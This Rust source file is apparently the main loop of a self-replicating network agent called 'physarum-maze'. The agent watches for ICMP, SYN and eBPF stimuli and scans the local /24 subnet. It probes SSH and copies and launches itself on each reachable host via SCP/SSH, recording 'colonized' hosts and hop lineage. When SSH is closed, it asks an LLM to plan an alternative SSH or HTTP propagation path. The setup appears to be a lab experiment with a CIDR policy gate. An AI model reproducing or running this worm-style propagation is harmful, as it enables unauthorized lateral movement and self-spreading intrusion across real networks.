/// Main agent event loop — PF-2 edition.
///
/// Stimulus sources (all feed the same candidate pipeline):
///   1. Raw ICMP socket: incoming echo requests (higher layers ping lower layers)
///   2. Raw TCP SYN socket: incoming SYN to port 22 (X→A.1 stimulus in PF-2)
///   3. Periodic /24 TCP-connect discovery: finds new hosts in the local subnet (A→A.1)
///
/// Per-candidate decision chain:
///   1. Skip if already in lineage path (cycle guard)
///   2. Skip if known dead end
///   3. Skip if already marked colonized this session
///   4. Skip if already attempted this session
///   5. TCP-22 probe: confirm SSH is listening
///   6. Colonization check: if target already runs physarum-maze → secondary conduit
///   7. Targeted nmap -sV scan (informational, non-blocking)
///   8. SCP push + SSH launch propagated instance
///   9. Update lineage + save /tmp/physarum-lineage.json
use crate::{
    lineage::Lineage,
    llm_loop::{self, LlmOutcome},
    propagation::{self, Outcome},
    Cli, Mode,
};
use anyhow::Result;
use physarum_llm::{MockLlmClient, OpenAiCompatibleClient, PolicyGate, PropagationMethodClass};
use std::collections::HashSet;
use std::net::Ipv4Addr;
use std::path::Path;
use std::str::FromStr;
use std::sync::Arc;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::sync::mpsc;
use tokio::time::timeout;

/// Resolved LLM configuration — None means LLM is disabled.
struct LlmConfig {
    client: Arc<dyn physarum_llm::LlmClient>,
    gate: PolicyGate,
}

impl LlmConfig {
    fn from_cli(cli: &Cli) -> Option<Self> {
        let endpoint = cli.llm_endpoint.as_deref()?;

        // Parse allowed CIDR for PolicyGate
        let allowed_cidrs = parse_cidr(cli.llm_allowed_cidr.as_deref()).unwrap_or_default();

        let mut gate = PolicyGate::lab_default();
        gate.allowed_cidrs = allowed_cidrs;

        let allowed_methods = vec![
            PropagationMethodClass::Ssh,
            PropagationMethodClass::Http,
            PropagationMethodClass::NoPath,
        ];

        let client: Arc<dyn physarum_llm::LlmClient> = if endpoint == "mock" {
            Arc::new(MockLlmClient::no_path("mock mode — no real LLM"))
        } else if endpoint == "mock-http" {
            // Docker Lab: real HTTP GET executed against target — proves full pipeline
            Arc::new(MockLlmClient::http_probe_with_plan("/", 0.9))
        } else {
            let api_key = cli.llm_api_key.clone().unwrap_or_default();
            match OpenAiCompatibleClient::new(
                endpoint,
                &cli.llm_model,
                api_key,
                cli.llm_timeout_ms,
                allowed_methods,
            ) {
                Ok(c) => Arc::new(c),
                Err(e) => {
                    tracing::warn!(err = %e, "failed to build LLM client — LLM disabled");
                    return None;
                }
            }
        };

        tracing::info!(
            endpoint,
            model = %cli.llm_model,
            cidrs = ?cli.llm_allowed_cidr,
            "LLM reasoning enabled"
        );

        Some(LlmConfig { client, gate })
    }
}

fn parse_cidr(cidr: Option<&str>) -> Option<Vec<(std::net::Ipv4Addr, u8)>> {
    let cidr = cidr?;
    let (ip_str, prefix_str) = cidr.split_once('/')?;
    let ip = std::net::Ipv4Addr::from_str(ip_str).ok()?;
    let prefix = prefix_str.parse::<u8>().ok()?;
    Some(vec![(ip, prefix)])
}

pub async fn run(cli: Cli) -> Result<()> {
    let llm = LlmConfig::from_cli(&cli);
    let mut lineage = init_lineage(&cli)?;
    lineage.save()?;

    if lineage.hops >= cli.max_hops {
        tracing::warn!(
            hops = lineage.hops,
            max = cli.max_hops,
            "max hops reached — dormant"
        );
        return Ok(());
    }

    let binary_path = std::env::current_exe()?;
    let local_ip = resolve_local_ip(&cli, &lineage);

    let mut icmp_rx = crate::icmp::start(cli.interface.clone());
    let mut tcp_rx = crate::tcp::start(cli.interface.clone());
    let mut ebpf_rx: Option<mpsc::Receiver<Ipv4Addr>> = init_ebpf(&cli);
    let mut discovery_ticker =
        tokio::time::interval(Duration::from_secs(cli.discovery_interval_secs));
    let mut attempted: HashSet<Ipv4Addr> = HashSet::new();

    // dormant_at is reset on every successful stimulus; when it fires the
    // organism goes dormant.  Using sleep_until lets us reset cheaply each loop.
    let stimulus_timeout = Duration::from_secs(cli.stimulus_timeout_secs);
    let mut dormant_at = tokio::time::Instant::now() + stimulus_timeout;

    tracing::info!(
        mode    = ?cli.mode,
        hops    = lineage.hops,
        origin  = %lineage.origin,
        path    = ?lineage.path,
        local   = ?local_ip.map(|ip| ip.to_string()),
        "physarum-maze agent ready — awaiting stimulus"
    );

    loop {
        tokio::select! {
            // ── ICMP echo-request stimulus ────────────────────────────────
            maybe_ip = icmp_rx.recv() => {
                match maybe_ip {
                    Some(ip) => {
                        dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                        handle_candidate(
                            ip, "icmp", &mut lineage, &binary_path, &mut attempted, &llm,
                        ).await?;
                    }
                    None => {
                        tracing::info!("ICMP channel closed — shutting down");
                        break;
                    }
                }
            }

            // ── TCP SYN to port 22 stimulus (PF-2: X → A.1) ──────────────
            maybe_ip = tcp_rx.recv() => {
                match maybe_ip {
                    Some(ip) => {
                        dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                        handle_candidate(
                            ip, "tcp-syn", &mut lineage, &binary_path, &mut attempted, &llm,
                        ).await?;
                    }
                    None => {
                        tracing::info!("TCP channel closed — shutting down");
                        break;
                    }
                }
            }

            // ── Periodic /24 TCP-connect discovery ───────────────────────
            _ = discovery_ticker.tick() => {
                if let Some(my_ip) = local_ip {
                    let candidates = crate::discovery::scan_local_subnet(my_ip).await;
                    for ip in candidates {
                        handle_candidate(
                            ip, "discovery", &mut lineage, &binary_path, &mut attempted, &llm,
                        ).await?;
                    }
                }
            }

            // ── eBPF inbound connection stimulus (Linux + bytecode path only) ──
            maybe_ebpf = async {
                if let Some(rx) = ebpf_rx.as_mut() {
                    rx.recv().await
                } else {
                    std::future::pending::<Option<Ipv4Addr>>().await
                }
            } => {
                match maybe_ebpf {
                    Some(ip) => {
                        dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                        handle_candidate(
                            ip, "ebpf", &mut lineage, &binary_path, &mut attempted, &llm,
                        ).await?;
                    }
                    None => {
                        tracing::info!("eBPF channel closed");
                        ebpf_rx = None;
                    }
                }
            }

            // ── Stimulus timeout ──────────────────────────────────────────
            _ = tokio::time::sleep_until(dormant_at) => {
                tracing::info!(
                    secs = cli.stimulus_timeout_secs,
                    "no stimulus — going dormant"
                );
                break;
            }
        }
    }

    tracing::info!(
        hops              = lineage.hops,
        path              = ?lineage.path,
        scores            = ?lineage.scores,
        secondary_conduits = ?lineage.secondary_conduits,
        "physarum-maze shutting down"
    );
    Ok(())
}

/// Process one candidate IP regardless of which stimulus source produced it.
async fn handle_candidate(
    src_ip: Ipv4Addr,
    stimulus: &str,
    lineage: &mut Lineage,
    binary_path: &Path,
    attempted: &mut HashSet<Ipv4Addr>,
    llm: &Option<LlmConfig>,
) -> Result<()> {
    let ip_str = src_ip.to_string();

    if lineage.is_visited(&ip_str) {
        tracing::debug!(%src_ip, stimulus, "already in lineage path — loop guard, skip");
        return Ok(());
    }
    if lineage.is_dead_end(&ip_str) {
        if stimulus == "discovery" {
            tracing::debug!(%src_ip, stimulus, "known dead end — skip passive probe");
            return Ok(());
        }
        // Active stimulus (icmp/tcp-syn/ebpf): the host is signalling its presence,
        // meaning the environment changed since the dead end was recorded.
        // Remove the mark and fall through to re-validate.
        tracing::info!(%src_ip, stimulus, "dead-ended host sent active stimulus — revalidating");
        lineage.unmark_dead_end(&ip_str);
        attempted.remove(&src_ip);
    }
    if lineage.is_colonized(&ip_str) {
        tracing::debug!(%src_ip, stimulus, "already colonized — skip");
        return Ok(());
    }
    if !attempted.insert(src_ip) {
        tracing::debug!(%src_ip, stimulus, "already attempted this session — skip");
        return Ok(());
    }

    tracing::info!(%src_ip, stimulus, "stimulus received — confirming SSH on port 22");

    if !port_22_open(src_ip).await {
        // Port 22 closed — Causal Continuity Paradox territory.
        // If LLM reasoning is enabled, ask it for an alternative propagation path
        // before giving up. Without LLM, fall through to dead-end scoring.
        if let Some(cfg) = llm {
            tracing::info!(%src_ip, stimulus, "port 22 closed — handing off to LLM reasoning loop");
            match llm_loop::run(src_ip, lineage, cfg.client.as_ref(), &cfg.gate).await? {
                LlmOutcome::Propagated => {
                    tracing::info!(%src_ip, "LLM propagation succeeded");
                    lineage.save()?;
                    return Ok(());
                }
                LlmOutcome::DeadEnd => {
                    tracing::warn!(%src_ip, "LLM exhausted — marking dead end");
                    lineage.mark_dead_end(&ip_str);
                    lineage.save()?;
                    return Ok(());
                }
            }
        }
        tracing::warn!(%src_ip, "port 22 not open — dead end");
        lineage.mark_dead_end(&ip_str);
        lineage.save()?;
        return Ok(());
    }

    // Targeted scan (informational — does not block propagation decision).
    crate::discovery::scan_targeted(src_ip);

    let next_lineage = lineage.extend(&ip_str);
    let next_b64 = next_lineage.to_b64()?;

    tracing::info!(%src_ip, hops = next_lineage.hops, "propagating");

    // propagate() performs the colonization check (step 0) before SCP.
    match propagation::propagate(src_ip, binary_path, &next_b64).await? {
        Outcome::Success => {
            tracing::info!(%src_ip, hops = next_lineage.hops, "propagation success");
            *lineage = next_lineage;
            lineage.save()?;
        }
        Outcome::AlreadyColonized => {
            tracing::info!(%src_ip, "already colonized — recording secondary conduit");
            let from = lineage
                .path
                .last()
                .cloned()
                .unwrap_or_else(|| lineage.origin.clone());
            lineage.mark_colonized(&ip_str);
            lineage.add_secondary_conduit(&from, &ip_str);
            lineage.save()?;
        }
        Outcome::ScpFailed => {
            tracing::warn!(%src_ip, "SCP failed — sshd AllowUsers blocked (dead end)");
            lineage.mark_dead_end(&ip_str);
            lineage.save()?;
        }
        Outcome::SshFailed => {
            tracing::warn!(%src_ip, "SSH launch failed — penalizing edge");
            lineage.penalize(&ip_str);
            lineage.save()?;
        }
    }

    Ok(())
}

fn init_lineage(cli: &Cli) -> Result<Lineage> {
    match &cli.mode {
        Mode::Seed => {
            let my_ip = local_ip(&cli.interface)?;
            tracing::info!(%my_ip, iface = %cli.interface, "seed mode");
            Ok(Lineage::seed(&my_ip.to_string()))
        }
        Mode::Propagated => {
            let b64 = cli
                .lineage_b64
                .as_deref()
                .ok_or_else(|| anyhow::anyhow!("--lineage-b64 required in propagated mode"))?;
            let lin = Lineage::from_b64(b64)?;
            tracing::info!(
                hops   = lin.hops,
                origin = %lin.origin,
                path   = ?lin.path,
                "propagated mode — lineage received"
            );
            Ok(lin)
        }
    }
}

/// Resolve the local IPv4 address used for /24 discovery.
///
/// In seed mode: read from the NIC.
/// In propagated mode: the last IP in the lineage path is the current host.
fn resolve_local_ip(cli: &Cli, lineage: &Lineage) -> Option<Ipv4Addr> {
    match &cli.mode {
        Mode::Seed => local_ip(&cli.interface).ok(),
        Mode::Propagated => lineage.path.last().and_then(|s| s.parse::<Ipv4Addr>().ok()),
    }
}

/// TCP connect probe — confirms port 22 is open and accepting connections.
async fn port_22_open(ip: Ipv4Addr) -> bool {
    match timeout(Duration::from_secs(5), TcpStream::connect((ip, 22u16))).await {
        Ok(Ok(_)) => {
            tracing::debug!(%ip, "port 22 open");
            true
        }
        Ok(Err(e)) => {
            tracing::debug!(%ip, error = %e, "port 22 refused");
            false
        }
        Err(_) => {
            tracing::debug!(%ip, "port 22 timeout");
            false
        }
    }
}

/// Initialize the optional eBPF stimulus receiver.
///
/// On Linux, if `--bpf-bytecode` was given, loads the eBPF program and returns
/// a Receiver that emits source IPs of inbound TCP connections from 10.60/16.
/// On all other platforms, or when no bytecode path is provided, returns None
/// so the corresponding select! arm uses `std::future::pending` and never fires.
fn init_ebpf(cli: &Cli) -> Option<mpsc::Receiver<Ipv4Addr>> {
    #[cfg(target_os = "linux")]
    if let Some(ref path) = cli.bpf_bytecode {
        match crate::ebpf::start(path) {
            Ok(rx) => {
                tracing::info!(?path, "eBPF stimulus enabled");
                return Some(rx);
            }
            Err(e) => {
                tracing::warn!(err = %e, "eBPF stimulus init failed — continuing without eBPF");
            }
        }
    }
    let _ = cli; // suppress unused-variable on non-Linux
    None
}

/// Determine the IPv4 address assigned to `interface`.
fn local_ip(interface: &str) -> anyhow::Result<Ipv4Addr> {
    for iface in if_addrs::get_if_addrs()? {
        if iface.name == interface {
            if let if_addrs::IfAddr::V4(v4) = iface.addr {
                return Ok(v4.ip);
            }
        }
    }
    anyhow::bail!("no IPv4 address found for interface '{}'", interface)
}
